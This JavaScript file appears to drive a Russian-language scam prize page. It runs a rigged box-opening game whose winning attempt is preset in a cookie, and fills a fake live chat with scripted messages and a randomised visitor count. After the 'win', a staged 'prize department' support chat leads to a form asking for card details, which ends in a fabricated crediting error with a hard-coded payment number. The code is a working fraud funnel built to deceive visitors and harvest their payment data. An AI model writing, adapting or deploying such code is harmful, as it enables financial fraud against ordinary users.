(() => {
  window.addEventListener('load', () => {

    let currentDate = new Date();

    document.querySelector('.app-content-title__date').innerText =
      `${currentDate.getDate()} ${currentDate.toLocaleString('default', { month: 'long' })} ${currentDate.getFullYear()}`;

    let randomInteger = (min, max) => {
      let rand = min + Math.random() * (max + 1 - min);
      return Math.floor(rand);
    }

    let setCookie = (name, value, options = {}) => {
      options = {
        path: '/'
      };

      if (options.expires instanceof Date) {
        options.expires = options.expires.toUTCString();
      }

      let updatedCookie = encodeURIComponent(name) + "=" + encodeURIComponent(value);

      for (let optionKey in options) {
        updatedCookie += "; " + optionKey;
        let optionValue = options[optionKey];
        if (optionValue !== true) {
          updatedCookie += "=" + optionValue;
        }
      }

      document.cookie = updatedCookie;
    }

    let checkWindowSupport = () => {
      document.querySelector('.app-content').classList.add('hide');
      document.querySelector('.app-content-wrap__title').innerText = 'Отдел выдачи призов';
      document.querySelector('.connect-support').classList.remove('hide');

      setTimeout(() => {
        setCookie('steep', '3', {secure: true, 'max-age': 3600});
        document.querySelector('.connect-support').classList.add('hide');
        document.querySelector('.support').classList.remove('hide');
      }, 2500);

    }

    let chatSupport = () => {
      let supportWrites = document.querySelector('.support-chat__writes'),
        supChat = document.querySelector('.support-chat'),
        chatWrites = supChat.querySelector('.support-chat__writes');

      supportWrites.classList.remove('hide');

      fetch('./chat/chat-support.json')
        .then(response => response.json())
        .then(json => {

          setTimeout(() => {
            for (let i = 0; i < json[0].steep1.length; i++) {
              localStorage.setItem(`sup${i}`, json[0].steep1[i].message);
            }
          }, 1500);
        });


     setTimeout(() => {
       for (let i = 0; i <= 2; i++) {
         let text = localStorage.getItem(`sup${i}`);
         let p = document.createElement('p');
         p.classList.add('support-chat__text');
         p.innerHTML = text;
         supChat.insertBefore(p, chatWrites)
       }
     }, 2000);
    }


    let getCookie = (name) => {
      let matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
      ));
      return matches ? decodeURIComponent(matches[1]) : undefined;
    }

    let itemsBox = document.querySelectorAll('.list-box__item');


    setTimeout(() => {
      document.querySelector('.loading').classList.remove('loading');
    }, 200);


    let popup = document.querySelector('.popup'),
      popupPreview = document.querySelector('.popup-preview'),
      popupFail = document.querySelector('.popup-fail'),
      popupWin = document.querySelector('.popup-win');


    let arrOpened = [];

    if (!getCookie('user')) {
      setCookie('steep', '1', {secure: true, 'max-age': 3600});
      setCookie('winRound', `${randomInteger(1, 3)}`, {secure: true, 'max-age': 3600});
      setCookie('current', '1', {secure: true, 'max-age': 3600});
      document.body.classList.add('fix');
      popup.classList.remove('hide');
      popupPreview.classList.remove('hide');
    } else {
      if (getCookie('win') && getCookie('steep') === '1') {
        document.querySelector('.app-content__prize').classList.add('view');

        setTimeout(() => {
          document.body.classList.add('fix');
          popup.classList.remove('hide');
          popupWin.classList.remove('hide');
        }, 3500);
      }

      if (localStorage.getItem('opened')) {
        arrOpened.push(localStorage.getItem('opened'));

        let arr = localStorage.getItem('opened').split(',');

        for (let i = 0; i < itemsBox.length; i++) {
          for (let x = 0; x < arr.length; x++) {
            if (i === +arr[x]) {
              itemsBox[i].classList.add('open', `${arr[x + 1]}`);
            }
          }
        }
      }

      if (+getCookie('steep') >= 2) {
        if (+getCookie('steep') > 2 && +getCookie('steep') < 7) {
          document.querySelector('.app-content').classList.add('hide');
          document.querySelector('.app-content-wrap__title').innerText = 'Отдел выдачи призов';
          document.querySelector('.connect-support').classList.add('hide');

          if (+getCookie('steep') > 2 && +getCookie('steep') < 4) {
            document.querySelector('.support').classList.remove('hide');

            setTimeout(() => {
              if (localStorage.getItem('sup2')) {
                let supChat = document.querySelector('.support-chat'),
                  chatWrites = supChat.querySelector('.support-chat__writes');

                if (localStorage.getItem('sup5')) {
                  for (let i = 4; i <= 6; i++) {
                    let text = localStorage.getItem(`sup${i}`);
                    let p = document.createElement('p');
                    p.classList.add('support-chat__text');
                    p.innerHTML = text;
                    supChat.insertBefore(p, chatWrites)
                  }

                } else {
                  for (let i = 0; i <= 2; i++) {
                    let text = localStorage.getItem(`sup${i}`);
                    let p = document.createElement('p');
                    p.classList.add('support-chat__text');
                    p.innerHTML = text;
                    supChat.insertBefore(p, chatWrites)
                  }
                }
              }
            }, 3000);
          }



          if (+getCookie('steep') === 4) {
            document.querySelector('.support-chat__btn-approve').innerHTML = 'Перейти к заполнению реквизитов';
          }
        }

        if (+getCookie('steep') === 5) {
          document.querySelector('.app-content').classList.add('hide');
          document.querySelector('.support').classList.add('hide');
          document.querySelector('.connect-support').classList.add('hide');
          document.querySelector('.app-content-wrap__title').innerText = 'Отдел выдачи призов';
          document.querySelector('.pay').classList.remove('hide');
        }

        if (+getCookie('steep') === 6) {
          document.querySelector('.pay-error').classList.remove('hide');
          document.querySelector('.app-content-wrap__title').innerText = 'Ошибка зачисления';
          document.querySelector('.app-content-wrap').classList.add('bg-red');
          document.querySelector('#pay-card').innerHTML = getCookie('card');
          document.querySelector('#pay-name').innerHTML = getCookie('user');
          document.querySelector('#pay-num').innerHTML = getCookie('pay-number');
          document.querySelector('#pay-date').innerHTML = getCookie('pay-date');
        }
      }
    }

    document.querySelector('.popup-preview__submit').addEventListener('click', () => {
      let userName = document.querySelector('#name').value;

      switch (userName) {
        case '':
        case undefined:
        case null:
          alert('Пожалуйста, введите Ваше имя')
          break;

        default:
          alert(`Желаем удачи, ${userName}!`);
          document.body.classList.remove('fix');
          popup.classList.add('hide');
          popupPreview.classList.add('hide');
      }

      setCookie('user', `${userName}`, {secure: true, 'max-age': 3600});
    })

    document.querySelector('.chat-form__btn-message').addEventListener('click', () => {
      let userMessage = document.querySelector('#user-message').value;

      switch (userMessage) {
        case '':
        case undefined:
        case null:
          alert('Введите сообщение');
          break;

        default:
          document.querySelector('.chat-form__btn-message').disabled = true;
          let date = new Date();

          document.querySelector('.chat-list').insertAdjacentHTML('beforeend', `
          <li class="chat-list__item">
            <div class="chat-list__avatar">
              <img src="img/avatars/def-avatar.jpg">
            </div>
            <div class="chat-list__messages">
              <strong>${getCookie('user')}</strong>
              <p>${userMessage}</p>
              <time>${String(date.getHours()).padStart(2, '0')}:${String(date.getMinutes()).padStart(2, '0')}</time>
            </div>
          </li>`);

          document.querySelector('#user-message').value = '';
          document.querySelector('#audio-chat').play();


          setTimeout(() => {
            document.querySelector('.chat-form__btn-message').disabled = false;
          }, 1000);

      }
    })

    let btnSettings = document.querySelectorAll('.chat-form__settings button');

    for (let btn of btnSettings) {
      btn.addEventListener('click', () => {
        alert('Функция не поддерживается Вашим браузером');
      })
    }

    for (let i = 0; i < itemsBox.length; i++) {
      itemsBox[i].addEventListener('click', () => {

        if (getCookie('win')) {
          return false
        }

        if (!itemsBox[i].classList.contains('open')) {
          if (getCookie('current') !== getCookie('winRound')) {
            itemsBox[i].classList.add('fail', 'open');
            document.querySelector('#audio-fail').play();

            switch (3 - +getCookie('current')) {
              case 2:
                document.querySelector('.num-fail').innerText = `У Вас осталось 2 попытки`;
                break;
              case 1:
                document.querySelector('.num-fail').innerText = `У Вас осталась 1 попытка`;
            }

            setCookie('current', `${+getCookie('current') + 1}`, {secure: true, 'max-age': 3600});
            arrOpened.push(i, 'fail');



            setTimeout(() => {
              document.body.classList.add('fix');
              popup.classList.remove('hide');
              popupFail.classList.remove('hide');
            }, 1000);
          } else if (getCookie('current') === getCookie('winRound')) {
            itemsBox[i].classList.add('win', 'open');
            document.querySelector('#audio-win').play();
            arrOpened.push(i, 'win');
            setCookie('win', 'true', {secure: true, 'max-age': 3600});
            document.querySelector('.app-content__prize').classList.add('view');

            setTimeout(() => {
              document.body.classList.add('fix');
              popup.classList.remove('hide');
              popupWin.classList.remove('hide');
            }, 3500);
          }
        }

        localStorage.setItem('opened', arrOpened);
      })
    }

    document.querySelector('.popup-fail__btn').addEventListener('click', () => {
      document.body.classList.remove('fix');
      popup.classList.add('hide');
      popupFail.classList.add('hide');
    })


    let chatMessage = () => {
      fetch('./chat/chat.json')
        .then(response => response.json())
        .then(json => {

          let i = 0;
          let interval = setTimeout(function addChat() {
            if (json[i] !== undefined) {

              let date = new Date();
              let srcScreen = null;

              if (json[i].screen) {
                srcScreen = `<img src=img/screenshots/${json[i].screen}>`;
              } else {
                srcScreen = '';
              }

              document.querySelector('.chat-list').insertAdjacentHTML('beforeend', `
          <li class="chat-list__item">
            <div class="chat-list__avatar">
              <img src=img/avatars/${json[i].photo}>
            </div>
            <div class="chat-list__messages">
              <strong>${json[i].name}</strong>
              <p>${json[i].message}
               ${srcScreen}
              </p>
           
              <time>${String(date.getHours()).padStart(2, '0')}:${String(date.getMinutes()).padStart(2, '0')}</time>
            </div>
          </li>`);
              i++;
              document.querySelector('#audio-chat').play();
              setTimeout(addChat, `${randomInteger(3, 10)}000`)
            } else {
              clearTimeout(interval);
            }
          }, `${randomInteger(3, 10)}000`);
        });
    }

    chatMessage();

    setTimeout(function randomOnline() {
      let online = document.querySelector('#online');

      if ((num = randomInteger(55, 64)) < 63) {
        online.innerHTML = `${num} человек`;
      } else {
        online.innerHTML = `${num} человека`;
      }

      setTimeout(randomOnline, `${randomInteger(3, 10)}000`)

    }, `${randomInteger(3, 10)}000`)



    document.querySelector('.popup-win__btn').addEventListener('click', () => {
      setCookie('steep', '2', {secure: true, 'max-age': 3600});
      document.body.classList.remove('fix');
      popup.classList.add('hide');
      popupWin.classList.add('hide');

      let promise = new Promise(function(resolve, reject) {
        setTimeout(() => {
          checkWindowSupport();
        }, 2000);
      });

      promise.then(
        setTimeout(() => {
          chatSupport();
        }, 5000)
      )


    });


    if (document.querySelector('.support-chat__btn-approve')) {
      document.querySelector('.support-chat__btn-approve').addEventListener('click', () => {
        if (+getCookie('steep') < 4) {
          document.querySelectorAll('.support-chat__text').forEach(el => el.style.display = 'none');

          fetch('./chat/chat-support.json')
            .then(response => response.json())
            .then(json => {

              setTimeout(() => {
                for (let i = 0; i < json[0].steep2.length; i++) {
                  localStorage.setItem(`sup${i + 4}`, json[0].steep2[i].message);
                  document.querySelector('.support-chat__btn-approve').innerHTML = 'Перейти к заполнению реквизитов';
                }
              }, 1500);
            });

          setTimeout(() => {
            let supChat = document.querySelector('.support-chat'),
              chatWrites = supChat.querySelector('.support-chat__writes');

            for (let i = 4; i <= 6; i++) {
              let text = localStorage.getItem(`sup${i}`);
              let p = document.createElement('p');
              p.classList.add('support-chat__text');
              p.innerHTML = text;
              supChat.insertBefore(p, chatWrites);
            }
          },2000);

          setCookie('steep', '4', {secure: true, 'max-age': 3600});
        } else {
          setCookie('steep', '5', {secure: true, 'max-age': 3600});
          document.querySelector('.support').classList.add('hide');
          document.querySelector('.app-content-wrap__title').innerText = 'Отдел выдачи призов';
          document.querySelector('.pay').classList.remove('hide');
        }
      })
    }


    document.querySelector('.select').addEventListener('click', (event) => {
      if (event.target.classList.contains('select') || event.target.parentElement.classList.contains('select')) {
        document.querySelector('.select').classList.add('open');
      } else {
        document.querySelector('.select').classList.remove('open');

        document.querySelectorAll('.select__item').forEach(item => item.addEventListener('click', () => {
          document.querySelector('.select__output').innerText = item.innerText
        }));
      }
    })

    window.addEventListener('click', (event) => {
      if (!event.target.classList.contains('select') && !event.target.parentElement.classList.contains('select')) {
        document.querySelector('.select').classList.remove('open');
      }
    })

    document.querySelector('.pay__btn').addEventListener('click', () => {
      let input = document.querySelector('.pay__input');

      if (input.value === '' || input.value ===  null || input.value === undefined) {
        alert('Необходимо заполнить поле');
        return false;
      } else {




        setCookie('steep', '6', {secure: true, 'max-age': 3600});
        setCookie('card', `${input.value}`, {secure: true, 'max-age': 3600});
        setCookie('pay-number', '72368810', {secure: true, 'max-age': 3600});
        setCookie('pay-date', `${currentDate.getDate()} ${currentDate.toLocaleString('default', { month: 'long' })} ${currentDate.getFullYear()}`, {secure: true, 'max-age': 3600});

        document.querySelector('.pay').classList.add('hide');
        document.querySelector('.pay-error').classList.remove('hide');
        document.querySelector('.app-content-wrap__title').innerText = 'Ошибка зачисления';
        document.querySelector('.app-content-wrap').classList.add('bg-red');

        let payDate = new Date();

        document.querySelector('#pay-card').innerHTML = getCookie('card');
        document.querySelector('#pay-name').innerHTML = getCookie('user');
        document.querySelector('#pay-num').innerHTML = getCookie('pay-number');
        document.querySelector('#pay-date').innerHTML = getCookie('pay-date');
      }
    })

  });
})();